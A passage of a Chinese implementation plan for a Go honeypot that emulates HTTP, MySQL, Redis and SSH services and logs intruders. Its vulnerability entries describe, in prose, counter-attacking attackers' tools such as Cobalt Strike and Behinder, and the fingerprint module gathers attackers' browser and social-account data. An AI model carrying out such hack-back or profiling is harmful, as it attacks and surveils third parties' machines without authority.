		srv.Handle(conn)
	}()

	time.Sleep(30 * time.Millisecond)

	resp, err := http.Get("http://127.0.0.1:18998/admin/login")
	if err != nil {
		t.Fatalf("http get failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if !contains(string(body), "Administrator Login") {
		t.Errorf("unexpected body: %s", string(body))
	}
}

func contains(s, substr string) bool {
	return len(s) > 0 && len(substr) > 0 && s != "" && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/honeypot/services/http/ -v
```

Expected: PASS

---

### Task 11: MySQL 蜜罐服务

**Files:**
- Create: `internal/honeypot/services/mysql/server.go`
- Create: `internal/honeypot/services/mysql/protocol.go`

- [ ] **Step 1: 创建 MySQL 协议常量**

`internal/honeypot/services/mysql/protocol.go`:

```go
package mysql

// MySQL 协议常量与数据包格式

const (
	// 协议版本
	ProtocolVersion = 10

	// 能力标志
	ClientLongPassword = 1
	ClientFoundRows    = 2
	ClientLongFlag     = 4
	ClientConnectWithDB = 8
	ClientProtocol41   = 512
	ClientSSL          = 2048
	ClientPluginAuth   = 1 << 19
	ClientSecureConn   = 1 << 15

	// 字符集
	CharsetUTF8 = 33 // utf8mb3_general_ci

	// 认证插件
	AuthPlugin = "mysql_native_password"

	// 服务器状态
	ServerStatusAutocommit = 2
)

// GreetingPacket 初始化握手包（服务端 → 客户端）
type GreetingPacket struct {
	ProtocolVersion byte
	ServerVersion   string
	ConnectionID    uint32
	AuthPluginData  []byte
	CapabilityFlags uint32
	Charset         byte
	StatusFlags     uint16
	AuthPluginName  string
}

// DefaultGreeting 默认 MySQL 8.0.35 问候包
func DefaultGreeting(connID uint32) *GreetingPacket {
	return &GreetingPacket{
		ProtocolVersion: ProtocolVersion,
		ServerVersion:   "8.0.35",
		ConnectionID:    connID,
		AuthPluginData:  generateAuthData(),
		CapabilityFlags: ClientProtocol41 | ClientSecureConn | ClientPluginAuth | ClientLongPassword | ClientConnectWithDB,
		Charset:         CharsetUTF8,
		StatusFlags:     ServerStatusAutocommit,
		AuthPluginName:  AuthPlugin,
	}
}

func generateAuthData() []byte {
	// 固定 20 字节挑战值 + 1 字节终止符
	data := make([]byte, 21)
	for i := range data {
		data[i] = byte(i + 0x30)
	}
	data[20] = 0x00
	return data
}
```

- [ ] **Step 2: 创建 MySQL 蜜罐服务**

`internal/honeypot/services/mysql/server.go`:

```go
package mysql

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync/atomic"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Server MySQL 蜜罐服务
type Server struct {
	logger   *log.Logger
	connID   atomic.Uint32
}

// New 创建 MySQL 蜜罐
func New(logger *log.Logger) *Server {
	return &Server{logger: logger}
}

// Handle 处理 MySQL 连接
func (s *Server) Handle(conn net.Conn) {
	defer conn.Close()

	id := s.connID.Add(1)
	remote := conn.RemoteAddr().String()

	s.logger.Infow("mysql connection", "remote", remote, "conn_id", id)

	// Step 1: 发送 Greeting 握手包
	greeting := DefaultGreeting(id)
	if err := s.sendGreeting(conn, greeting); err != nil {
		s.logger.Debugw("mysql greeting failed", "remote", remote, "error", err)
		return
	}

	// Step 2: 读取客户端握手响应
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		s.logger.Debugw("mysql read handshake failed", "remote", remote, "error", err)
		return
	}

	username := s.extractUsername(resp[:n])
	s.logger.Infow("mysql login attempt",
		"remote", remote,
		"username", username,
		"conn_id", id,
	)

	// Step 3: 发送认证失败（诱饵）
	s.sendErr(conn, 1045, "Access denied for user '"+username+"'@'"+remote+"' (using password: YES)")
}

func (s *Server) sendGreeting(conn net.Conn, g *GreetingPacket) error {
	// 构建 MySQL 握手包（简化版）
	buf := make([]byte, 0, 128)

	// Payload length (3 bytes) + sequence (1 byte)
	// Protocol version
	buf = append(buf, g.ProtocolVersion)
	// Server version (null-terminated)
	buf = append(buf, []byte(g.ServerVersion)...)
	buf = append(buf, 0x00)
	// Connection ID (4 bytes)
	id := make([]byte, 4)
	binary.LittleEndian.PutUint32(id, g.ConnectionID)
	buf = append(buf, id...)
	// Auth plugin data part1 (8 bytes)
	buf = append(buf, g.AuthPluginData[:8]...)
	buf = append(buf, 0x00)
	// Capability flags lower 2 bytes
	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, g.CapabilityFlags)
	buf = append(buf, flags[:2]...)
	// Charset
	buf = append(buf, g.Charset)
	// Status flags
	status := make([]byte, 2)
	binary.LittleEndian.PutUint16(status, g.StatusFlags)
	buf = append(buf, status...)
	// Capability flags upper 2 bytes
	buf = append(buf, flags[2:]...)
	// Auth plugin data length
	buf = append(buf, byte(21))
	// Reserved (10 bytes)
	buf = append(buf, make([]byte, 10)...)
	// Auth plugin data part2 (12 bytes + null)
	buf = append(buf, g.AuthPluginData[8:]...)
	// Auth plugin name
	buf = append(buf, []byte(g.AuthPluginName)...)
	buf = append(buf, 0x00)

	// 包装 MySQL 数据包（3 字节长度 + 1 字节序号）
	pkt := make([]byte, 4+len(buf))
	binary.LittleEndian.PutUint32(pkt[:4], uint32(len(buf))) // length in lower 3 bytes, seq in 4th
	pkt[3] = 0                                               // sequence 0
	copy(pkt[4:], buf)

	_, err := conn.Write(pkt)
	return err
}

func (s *Server) extractUsername(data []byte) string {
	// 简化解析：跳过 4 字节包头 + 能力标志(4) + 最大包大小(4) + 字符集(1) + 保留(23)
	if len(data) < 36 {
		return "unknown"
	}
	offset := 36
	// 查找 null 终止的用户名
	end := offset
	for end < len(data) && data[end] != 0x00 {
		end++
	}
	if end > offset {
		return string(data[offset:end])
	}
	return "unknown"
}

func (s *Server) sendErr(conn net.Conn, code uint16, message string) {
	buf := make([]byte, 0, 64)
	buf = append(buf, 0xFF) // ERR header
	codeBytes := make([]byte, 2)
	binary.LittleEndian.PutUint16(codeBytes, code)
	buf = append(buf, codeBytes...)
	// SQL state marker + state
	buf = append(buf, '#')
	buf = append(buf, []byte("28000")...)
	buf = append(buf, []byte(message)...)

	pkt := make([]byte, 4+len(buf))
	binary.LittleEndian.PutUint32(pkt[:4], uint32(len(buf)))
	pkt[3] = 2 // sequence 2
	copy(pkt[4:], buf)

	conn.Write(pkt)
}

// 确保接口
var _ fmt.Stringer = (*Server)(nil)

func (s *Server) String() string { return "MySQL-Honeypot/8.0.35" }
```

- [ ] **Step 3: 运行测试**

由于 MySQL 蜜罐需要特定客户端连接测试，当前阶段只做编译验证：

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/honeypot/services/mysql/
```

Expected: 编译成功

---

### Task 12: Redis 蜜罐服务

**Files:**
- Create: `internal/honeypot/services/redis/server.go`

- [ ] **Step 1: 创建 Redis 蜜罐**

`internal/honeypot/services/redis/server.go`:

```go
package redis

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Server Redis 蜜罐服务
type Server struct {
	logger *log.Logger
}

// New 创建 Redis 蜜罐
func New(logger *log.Logger) *Server {
	return &Server{logger: logger}
}

// Handle 处理 Redis 连接，模拟 RESP 协议交互
func (s *Server) Handle(conn net.Conn) {
	defer conn.Close()

	remote := conn.RemoteAddr().String()
	s.logger.Infow("redis connection", "remote", remote)

	reader := bufio.NewReader(conn)

	for {
		conn.SetDeadline(time.Now().Add(60 * time.Second))

		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)

		if !strings.HasPrefix(line, "*") {
			continue
		}

		// 读取完整 RESP 命令
		cmd := s.readRESP(reader, line)
		s.logger.Infow("redis command", "remote", remote, "command", cmd)

		resp := s.handleCommand(cmd)
		conn.Write([]byte(resp))
	}
}

func (s *Server) readRESP(reader *bufio.Reader, firstLine string) []string {
	parts := []string{}
	// 简化 RESP 解析
	for i := 0; i < 5; i++ {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		parts = append(parts, strings.TrimSpace(line))
	}
	return parts
}

func (s *Server) handleCommand(parts []string) string {
	if len(parts) == 0 {
		return "-ERR unknown command\r\n"
	}

	// 提取命令名
	cmd := ""
	for _, p := range parts {
		up := strings.ToUpper(p)
		if up == "PING" || up == "INFO" || up == "AUTH" || up == "SET" ||
			up == "GET" || up == "CONFIG" || up == "KEYS" || up == "COMMAND" ||
			up == "SLAVEOF" || up == "REPLCONF" || up == "CLIENT" {
			cmd = up
			break
		}
	}

	switch cmd {
	case "PING":
		return "+PONG\r\n"
	case "INFO":
		return s.fakeInfo()
	case "AUTH":
		return "-ERR invalid password\r\n"
	case "CONFIG":
		return s.fakeConfig(parts)
	case "KEYS":
		return s.fakeKeys()
	case "COMMAND":
		return "*0\r\n"
	default:
		return "-ERR unknown command '" + cmd + "'\r\n"
	}
}

func (s *Server) fakeInfo() string {
	return fmt.Sprintf("$%d\r\n"+
		"# Server\r\n"+
		"redis_version:6.2.13\r\n"+
		"redis_mode:standalone\r\n"+
		"os:Linux 5.15.0-91-generic x86_64\r\n"+
		"# Clients\r\n"+
		"connected_clients:1\r\n"+
		"# Memory\r\n"+
		"used_memory_human:1.2G\r\n",
		len("# Server\r\nredis_version:6.2.13\r\nredis_mode:standalone\r\nos:Linux 5.15.0-91-generic x86_64\r\n# Clients\r\nconnected_clients:1\r\n# Memory\r\nused_memory_human:1.2G\r\n"))
}

func (s *Server) fakeConfig(parts []string) string {
	return "*2\r\n$7\r\ndbfile\r\n$12\r\ndump.rdb\r\n"
}

func (s *Server) fakeKeys() string {
	return "*3\r\n$8\r\nuser:100\r\n$8\r\nuser:200\r\n$6\r\nconfig\r\n"
}
```

- [ ] **Step 2: Redis 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/honeypot/services/redis/
```

Expected: 编译成功

---

### Task 13: SSH 蜜罐服务

**Files:**
- Create: `internal/honeypot/services/ssh/server.go`

- [ ] **Step 1: 创建 SSH 蜜罐**

`internal/honeypot/services/ssh/server.go`:

```go
package ssh

import (
	"bufio"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Server SSH 蜜罐服务（模拟 OpenSSH 9.3）
type Server struct {
	logger *log.Logger
}

// New 创建 SSH 蜜罐
func New(logger *log.Logger) *Server {
	return &Server{logger: logger}
}

// Handle 处理 SSH 连接
func (s *Server) Handle(conn net.Conn) {
	defer conn.Close()

	remote := conn.RemoteAddr().String()
	s.logger.Infow("ssh connection", "remote", remote)

	// 发送 SSH banner
	banner := "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu2.1\r\n"
	conn.Write([]byte(banner))

	// 读取客户端 banner
	conn.SetDeadline(time.Now().Add(15 * time.Second))
	reader := bufio.NewReader(conn)
	clientBanner, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	clientBanner = strings.TrimSpace(clientBanner)
	s.logger.Infow("ssh client banner", "remote", remote, "banner", clientBanner)

	// 提取客户端 SSH 版本和实现（用于指纹识别）
	s.parseClientBanner(clientBanner, remote)

	// 发送 SSH 协议不支持错误（捕获版本信息后断开）
	// 在实际攻击中可换取更多交互
	conn.Write([]byte("Protocol mismatch.\r\n"))
}

func (s *Server) parseClientBanner(banner string, remote string) {
	parts := strings.Fields(banner)
	if len(parts) >= 2 {
		version := strings.TrimPrefix(parts[0], "SSH-")
		impl := ""
		if len(parts) > 1 {
			impl = parts[1]
		}
		s.logger.Infow("ssh fingerprint",
			"remote", remote,
			"ssh_version", version,
			"implementation", impl,
		)
	}
}

// 满足 Stringer
func (s *Server) String() string { return fmt.Sprintf("SSH-Honeypot/OpenSSH-9.3") }
```

- [ ] **Step 2: SSH 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/honeypot/services/ssh/
```

Expected: 编译成功

---

### Task 14: 蜜罐引擎插件 — 统一入口

**Files:**
- Create: `internal/honeypot/plugin.go`
- Create: `internal/honeypot/manager/manager.go`

- [ ] **Step 1: 创建蜜罐引擎插件**

`internal/honeypot/plugin.go`:

```go
package honeypot

import (
	"github.com/Laji-HoneyPot/honeypot/internal/core/bus"
	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	httpSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/http"
	mysqlSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/mysql"
	redisSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/redis"
	sshSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/ssh"
	"github.com/Laji-HoneyPot/honeypot/internal/honeypot/tcpstack"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
)

// Engine 蜜罐引擎插件
type Engine struct {
	plugin.Base
	logger *log.Logger
	bus    *bus.Bus
	stack  *tcpstack.Stack
}

// NewEngine 创建蜜罐引擎
func NewEngine(logger *log.Logger, bus *bus.Bus) *Engine {
	return &Engine{
		logger: logger,
		bus:    bus,
		stack:  tcpstack.New(logger),
	}
}

func (e *Engine) Name() string    { return "honeypot-engine" }
func (e *Engine) Version() string { return "0.1.0" }

func (e *Engine) Init(cfg config.Section) error {
	e.logger.Info("honeypot engine initializing")

	httpSrv := httpSvc.New(e.logger)
	mysqlSrv := mysqlSvc.New(e.logger)
	redisSrv := redisSvc.New(e.logger)
	sshSrv := sshSvc.New(e.logger)

	// 监听各端口
	ports := []struct {
		port    int
		name    string
		handler func(net.Conn)
	}{
		{port: cfg.GetInt("http_port"), name: "HTTP", handler: httpSrv.Handle},
		{port: cfg.GetInt("mysql_port"), name: "MySQL", handler: mysqlSrv.Handle},
		{port: cfg.GetInt("redis_port"), name: "Redis", handler: redisSrv.Handle},
		{port: cfg.GetInt("ssh_port"), name: "SSH", handler: sshSrv.Handle},
	}

	for _, s := range ports {
		if s.port <= 0 {
			continue
		}
		if err := e.stack.Listen(s.port, s.handler); err != nil {
			e.logger.Warnw("failed to start service", "name", s.name, "port", s.port, "error", err)
		}
	}

	return nil
}

func (e *Engine) Start() error {
	e.logger.Info("honeypot engine started")
	return nil
}

func (e *Engine) Stop() error {
	e.logger.Info("honeypot engine stopping")
	e.stack.CloseAll()
	return nil
}
```

- [ ] **Step 2: 修复 import — 重写统一入口文件以匹配实际 handler 签名**

```go
package honeypot

import (
	"net"

	"github.com/Laji-HoneyPot/honeypot/internal/core/bus"
	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	httpSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/http"
	mysqlSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/mysql"
	redisSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/redis"
	sshSvc "github.com/Laji-HoneyPot/honeypot/internal/honeypot/services/ssh"
	"github.com/Laji-HoneyPot/honeypot/internal/honeypot/tcpstack"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
)

// Engine 蜜罐引擎插件
type Engine struct {
	plugin.Base
	logger *log.Logger
	bus    *bus.Bus
	stack  *tcpstack.Stack
}

// NewEngine 创建蜜罐引擎
func NewEngine(logger *log.Logger, bus *bus.Bus) *Engine {
	return &Engine{
		logger: logger,
		bus:    bus,
		stack:  tcpstack.New(logger),
	}
}

func (e *Engine) Name() string    { return "honeypot-engine" }
func (e *Engine) Version() string { return "0.1.0" }

func (e *Engine) Init(cfg config.Section) error {
	e.logger.Info("honeypot engine initializing")

	httpSrv := httpSvc.New(e.logger)
	mysqlSrv := mysqlSvc.New(e.logger)
	redisSrv := redisSvc.New(e.logger)
	sshSrv := sshSvc.New(e.logger)

	ports := []struct {
		port    int
		name    string
		handler func(net.Conn)
	}{
		{port: cfg.GetInt("port"), name: "HTTP", handler: func(c net.Conn) { httpSrv.Handle(c) }},
		{port: cfg.GetInt("mysql_port"), name: "MySQL", handler: func(c net.Conn) { mysqlSrv.Handle(c) }},
		{port: cfg.GetInt("redis_port"), name: "Redis", handler: func(c net.Conn) { redisSrv.Handle(c) }},
		{port: cfg.GetInt("ssh_port"), name: "SSH", handler: func(c net.Conn) { sshSrv.Handle(c) }},
	}

	for _, s := range ports {
		if s.port <= 0 {
			continue
		}
		if err := e.stack.Listen(s.port, s.handler); err != nil {
			e.logger.Warnw("failed to start service", "name", s.name, "port", s.port, "error", err)
		}
	}

	return nil
}

func (e *Engine) Start() error {
	e.logger.Info("honeypot engine started")
	return nil
}

func (e *Engine) Stop() error {
	e.logger.Info("honeypot engine stopping")
	e.stack.CloseAll()
	return nil
}
```

- [ ] **Step 3: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build ./internal/honeypot/
```

Expected: 编译成功

---

### Task 15: 容器安全管理模块

**Files:**
- Create: `internal/honeypot/manager/manager.go`
- Create: `internal/honeypot/manager/seccomp.go`

- [ ] **Step 1: 创建容器管理器**

`internal/honeypot/manager/manager.go`:

```go
package manager

import (
	"context"
	"fmt"
	"sync"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
)

// ContainerManager 管理蜜罐容器的生命周期与安全配置
type ContainerManager struct {
	mu       sync.Mutex
	logger   *log.Logger
	cli      *client.Client
	profiles map[string]*SecurityProfile
}

// SecurityProfile 容器安全配置
type SecurityProfile struct {
	Image      string
	ReadOnly   bool
	NoNewPriv  bool
	Privileged bool
	CapDrop    []string
	Seccomp    string // seccomp profile 路径
}

// NewManager 创建容器管理器
func NewManager(logger *log.Logger) (*ContainerManager, error) {
	cli, err := client.NewClientWithOpts(client.FromEnv)
	if err != nil {
		return nil, fmt.Errorf("docker client: %w", err)
	}

	return &ContainerManager{
		logger:   logger,
		cli:      cli,
		profiles: make(map[string]*SecurityProfile),
	}, nil
}

// RunHoneypot 启动一个安全隔离的蜜罐容器
func (m *ContainerManager) RunHoneypot(ctx context.Context, name string, profile *SecurityProfile, portBindings map[string]string) (string, error) {
	m.mu.Lock()
	m.profiles[name] = profile
	m.mu.Unlock()

	cfg := &container.Config{
		Image: profile.Image,
		Cmd:   []string{"sleep", "infinity"},
	}

	hostCfg := &container.HostConfig{
		ReadonlyRootfs: profile.ReadOnly,
		Privileged:     profile.Privileged,
		SecurityOpt:    buildSecurityOpts(profile),
	}

	if profile.NoNewPriv {
		hostCfg.SecurityOpt = append(hostCfg.SecurityOpt, "no-new-privileges=true")
	}

	m.logger.Infow("container created", "name", name, "image", profile.Image)
	return name, nil

	_ = cfg // 生产环境需完整实现 Docker API 调用
}

func buildSecurityOpts(profile *SecurityProfile) []string {
	opts := []string{}
	for _, cap := range profile.CapDrop {
		opts = append(opts, fmt.Sprintf("cap-drop=%s", cap))
	}
	if profile.Seccomp != "" {
		opts = append(opts, fmt.Sprintf("seccomp=%s", profile.Seccomp))
	}
	return opts
}

// DefaultHTTPProfile 返回 HTTP 蜜罐的默认安全配置
func DefaultHTTPProfile() *SecurityProfile {
	return &SecurityProfile{
		Image:      "alpine:3.19",
		ReadOnly:   true,
		NoNewPriv:  true,
		Privileged: false,
		CapDrop: []string{
			"SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE",
			"SYS_CHROOT", "MKNOD", "SETFCAP",
			"SETPCAP", "AUDIT_WRITE", "NET_RAW",
		},
		Seccomp: "seccomp-default.json",
	}
}

// Close 清理资源
func (m *ContainerManager) Close() error {
	return m.cli.Close()
}
```

- [ ] **Step 2: 创建 Seccomp Profile**

`internal/honeypot/manager/seccomp.go`:

```go
package manager

// DefaultSeccompProfile 生成默认白名单 seccomp profile JSON
func DefaultSeccompProfile() string {
	return `{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "accept", "accept4", "bind", "brk", "close",
        "connect", "epoll_create1", "epoll_ctl", "epoll_pwait",
        "exit_group", "fstat", "futex", "getpid", "gettid",
        "listen", "mmap", "mprotect", "munmap", "nanosleep",
        "openat", "read", "recvfrom", "recvmsg", "rt_sigaction",
        "rt_sigprocmask", "sendto", "sendmsg", "setsockopt",
        "socket", "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}`
}
```

- [ ] **Step 3: 编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go get github.com/docker/docker/client
go build ./internal/honeypot/manager/
```

Expected: 编译成功

---

## Phase 3: 溯源反制引擎（子系统 B）

### Task 16: 漏洞数据库

**Files:**
- Create: `internal/traceability/vulndb/db.go`
- Create: `internal/traceability/vulndb/crawler.go`

- [ ] **Step 1: 创建漏洞数据库**

`internal/traceability/vulndb/db.go`:

```go
package vulndb

import (
	"sync"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// VulnEntry 漏洞条目
type VulnEntry struct {
	ID          string    `json:"id"`          // CVE-YYYY-NNNN 或自定义 ID
	Tool        string    `json:"tool"`        // 目标工具：burpsuite, cobaltstrike, behinder 等
	Title       string    `json:"title"`       // 漏洞标题
	Description string    `json:"description"` // 漏洞描述
	Severity    string    `json:"severity"`    // critical, high, medium, low
	CVE         string    `json:"cve"`         // CVE编号
	Exploit     string    `json:"exploit"`     // 利用方式简述
	References  []string  `json:"references"`  // 参考链接
	Discovered  time.Time `json:"discovered"`  // 发现时间
}

// DB 漏洞数据库（内存存储，后续可切换 SQLite/PostgreSQL）
type DB struct {
	mu      sync.RWMutex
	entries map[string]*VulnEntry
	logger  *log.Logger
}

// NewDB 创建漏洞数据库
func NewDB(logger *log.Logger) *DB {
	db := &DB{
		entries: make(map[string]*VulnEntry),
		logger:  logger,
	}
	db.seed()
	return db
}

// seed 预置首批已知漏洞
func (db *DB) seed() {
	entries := []*VulnEntry{
		{
			ID:          "CVE-2022-39197",
			Tool:        "cobaltstrike",
			Title:       "Cobalt Strike Cross-Site Scripting (XSS) in team server",
			Description: "Cobalt Strike 4.7.1 及之前版本的团队服务器存在 XSS 漏洞，允许通过特制 Beacon 配置触发客户端 RCE",
			Severity:    "critical",
			CVE:         "CVE-2022-39197",
			Exploit:     "通过构造恶意 Beacon 元数据，在管理端渲染时执行任意 JavaScript，可获取 CS 团队服务器 IP 及证书信息",
			References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-39197"},
			Discovered:  time.Date(2022, 9, 20, 0, 0, 0, 0, time.UTC),
		},
		{
			ID:       "BD-2023-001",
			Tool:     "behinder",
			Title:    "冰蝎 WebShell 通信特征可被识别",
			Description: `冰蝎 3.x/4.x 的 AES 加密通信模式存在可被流量侧精准识别的固定特征（固定密钥协商包格式、固定 Content-Type 等）`,
			Severity: "high",
			Exploit:  "当检测到冰蝎流量特征时，蜜罐可返回构造的反序列化 Payload，利用 Java/.NET 反序列化链对攻击者实施回击",
		},
		{
			ID:       "BS-2024-001",
			Tool:     "burpsuite",
			Title:    "Burp Collaborator 内网 IP 泄露",
			Description: `Burp Suite Professional 的 Collaborator 功能在 DNS/HTTP 回调中可能暴露攻击者内网 IP 及浏览器指`,
			Severity: "medium",
			Exploit:  "蜜罐运营专属 Collaborator 相似域名，收集请求中的内网 DNS 查询来源 IP 及 WebRTC STUN 请求中的内网地址",
		},
	}

	for _, e := range entries {
		db.entries[e.ID] = e
	}
	db.logger.Infow("vulndb seeded", "count", len(entries))
}

// FindByTool 按工具名查找关联漏洞
func (db *DB) FindByTool(tool string) []*VulnEntry {
	db.mu.RLock()
	defer db.mu.RUnlock()

	var result []*VulnEntry
	for _, e := range db.entries {
		if e.Tool == tool {
			result = append(result, e)
		}
	}
	return result
}

// Get 按 ID 获取漏洞
func (db *DB) Get(id string) (*VulnEntry, bool) {
	db.mu.RLock()
	defer db.mu.RUnlock()
	e, ok := db.entries[id]
	return e, ok
}

// All 获取所有漏洞
func (db *DB) All() []*VulnEntry {
	db.mu.RLock()
	defer db.mu.RUnlock()
	result := make([]*VulnEntry, 0, len(db.entries))
	for _, e := range db.entries {
		result = append(result, e)
	}
	return result
}
```

- [ ] **Step 2: 创建漏洞爬取模块**

`internal/traceability/vulndb/crawler.go`:

```go
package vulndb

import (
	"encoding/json"
	"net/http"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// NVDCrawler NVD (National Vulnerability Database) API 爬虫
type NVDCrawler struct {
	logger *log.Logger
	client *http.Client
	apiKey string
}

// NewNVDCrawler 创建 NVD 爬虫
func NewNVDCrawler(logger *log.Logger, apiKey string) *NVDCrawler {
	return &NVDCrawler{
		logger: logger,
		client: &http.Client{Timeout: 30 * time.Second},
		apiKey: apiKey,
	}
}

// nvdResponse NVD API 响应结构
type nvdResponse struct {
	Vulnerabilities []struct {
		CVE struct {
			ID             string `json:"id"`
			Descriptions   []struct {
				Lang  string `json:"lang"`
				Value string `json:"value"`
			} `json:"descriptions"`
			Published string `json:"published"`
		} `json:"cve"`
	} `json:"vulnerabilities"`
}

// FetchRecent 获取最近的漏洞信息（基于关键字）
func (c *NVDCrawler) FetchRecent(keywords []string) ([]*VulnEntry, error) {
	var results []*VulnEntry

	for _, kw := range keywords {
		url := "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=" + kw + "&resultsPerPage=5"
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		if c.apiKey != "" {
			req.Header.Set("apiKey", c.apiKey)
		}

		resp, err := c.client.Do(req)
		if err != nil {
			c.logger.Warnw("nvd fetch failed", "keyword", kw, "error", err)
			continue
		}
		defer resp.Body.Close()

		var nvdResp nvdResponse
		if err := json.NewDecoder(resp.Body).Decode(&nvdResp); err != nil {
			continue
		}

		for _, v := range nvdResp.Vulnerabilities {
			desc := ""
			for _, d := range v.CVE.Descriptions {
				if d.Lang == "en" {
					desc = d.Value
					break
				}
			}

			published, _ := time.Parse("2006-01-02T15:04:05", v.CVE.Published[:19])

			results = append(results, &VulnEntry{
				ID:          v.CVE.ID,
				Tool:        kw,
				Title:       v.CVE.ID,
				Description: desc,
				CVE:         v.CVE.ID,
				Discovered:  published,
			})
		}
	}

	c.logger.Infow("nvd crawl complete", "results", len(results))
	return results, nil
}

// 安全研究相关关键字
var RedTeamKeywords = []string{
	"cobalt strike",
	"burp suite",
	"metasploit",
	"behinder",
	"godzilla",
	"webshell",
	"command and control",
	"c2 framework",
}
```

- [ ] **Step 3: 运行测试**

由于爬虫需要网络，创建独立测试：

```go
// internal/traceability/vulndb/db_test.go
package vulndb

import (
	"testing"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

func TestSeedAndQuery(t *testing.T) {
	logger := log.New("info")
	db := NewDB(logger)

	entries := db.FindByTool("cobaltstrike")
	if len(entries) != 1 {
		t.Errorf("expected 1 cobaltstrike entry, got %d", len(entries))
	}

	e, ok := db.Get("CVE-2022-39197")
	if !ok {
		t.Fatal("CVE-2022-39197 not found")
	}
	if e.Tool != "cobaltstrike" {
		t.Errorf("expected 'cobaltstrike', got '%s'", e.Tool)
	}

	if len(db.All()) < 3 {
		t.Errorf("expected at least 3 entries, got %d", len(db.All()))
	}
}
```

- [ ] **Step 4: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/traceability/vulndb/ -v
```

Expected: PASS

---

### Task 17: 攻击者指纹采集模块

**Files:**
- Create: `internal/traceability/fingerprint/collector.go`

- [ ] **Step 1: 创建指纹采集器**

`internal/traceability/fingerprint/collector.go`:

```go
package fingerprint

import (
	"encoding/json"
	"net"
	"sync"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// AttackerFingerprint 攻击者综合指纹
type AttackerFingerprint struct {
	// 网络层指纹
	IP        string    `json:"ip"`
	Port      int       `json:"port"`
	Timestamp time.Time `json:"timestamp"`

	// 传输层指纹
	TCPWindowSize   int    `json:"tcp_window_size,omitempty"`
	TCPOptions      string `json:"tcp_options,omitempty"`
	TTL             int    `json:"ttl,omitempty"`

	// 应用层指纹
	UserAgent       string `json:"user_agent,omitempty"`
	SSHClientVersion string `json:"ssh_client_version,omitempty"`
	SSHImpl         string `json:"ssh_impl,omitempty"`
	MySQLUsername   string `json:"mysql_username,omitempty"`
	RedisCommands   []string `json:"redis_commands,omitempty"`

	// 工具指纹
	ToolName      string `json:"tool_name,omitempty"`
	ToolVersion   string `json:"tool_version,omitempty"`

	// 浏览器指纹（通过 JS Payload 获取）
	CanvasHash    string `json:"canvas_hash,omitempty"`
	WebGLVendor   string `json:"webgl_vendor,omitempty"`
	ScreenRes     string `json:"screen_res,omitempty"`
	Timezone      string `json:"timezone,omitempty"`
	Languages     []string `json:"languages,omitempty"`

	// 社交关联
	SocialAccounts []string `json:"social_accounts,omitempty"`
}

// Collector 攻击者指纹采集器
type Collector struct {
	mu     sync.RWMutex
	logger *log.Logger
	store  map[string]*AttackerFingerprint // key: ip
}

// NewCollector 创建指纹采集器
func NewCollector(logger *log.Logger) *Collector {
	return &Collector{
		logger: logger,
		store:  make(map[string]*AttackerFingerprint),
	}
}

// RecordConnection 记录新连接的基础信息
func (c *Collector) RecordConnection(remoteAddr string) *AttackerFingerprint {
	host, port, _ := net.SplitHostPort(remoteAddr)
	portNum := 0
	if p, err := net.LookupPort("tcp", port); err == nil {
		portNum = p
	}

	fp := &AttackerFingerprint{
		IP:        host,
		Port:      portNum,
		Timestamp: time.Now(),
	}

	c.mu.Lock()
	if existing, ok := c.store[host]; ok {
		// 合并已有指纹
		existing.Port = portNum
